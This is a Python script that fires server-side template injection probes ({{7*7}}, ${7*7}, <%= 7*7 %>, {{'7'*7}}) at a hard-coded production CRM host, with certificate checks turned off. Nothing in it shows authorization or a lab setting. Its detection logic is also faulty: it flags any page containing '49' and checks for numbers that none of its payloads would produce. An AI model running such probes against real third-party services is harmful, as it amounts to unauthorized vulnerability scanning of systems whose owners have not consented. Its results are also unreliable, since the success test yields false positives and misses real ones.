import requests
import urllib.parse

def test_ssti(url, payload):
    print(f"[*] Testing payload: {payload}")
    encoded_payload = urllib.parse.quote(payload)
    target = f"{url}?name={encoded_payload}"
    
    try:
        r = requests.get(target, timeout=10, verify=False)
        print(f"  [+] Status Code: {r.status_code}")
        
        # Check for our expected math evaluation result
        if "49" in r.text or "4913" in r.text or "111111111" in r.text:
            print(f"  [!] SUCCESS: Mathematical evaluation successful!")
            
            # Print a snippet of where the evaluation happened
            lines = r.text.split('\n')
            for i, line in enumerate(lines):
                if "49" in line or "4913" in line or "111111111" in line:
                    start = max(0, i-1)
                    end = min(len(lines), i+2)
                    print("\n  [Reflection Snippet]:")
                    for j in range(start, end):
                        print(f"    {lines[j].strip()[:100]}")
                    break
            return True
        else:
            print("  [-] Failed: Payload was not evaluated.")
            return False
            
    except Exception as e:
        print(f"  [-] Error: {e}")
        return False

def main():
    base_url = "https://crm.na1.insightly.com"
    
    print(f"[*] Starting SSTI verification on {base_url}")
    print("-" * 50)
    
    # Payload 1: Basic math (Jinja2/Twig/Nunjucks/etc.)
    test_ssti(base_url, "{{7*7}}")
    
    # Payload 2: Basic math (FreeMarker/Velocity/etc.)
    test_ssti(base_url, "${7*7}")
    
    # Payload 3: Basic math (ERB)
    test_ssti(base_url, "<%= 7*7 %>")
    
    # Payload 4: Basic string manipulation (detects backend language)
    test_ssti(base_url, "{{'7'*7}}")
    
if __name__ == "__main__":
    main()
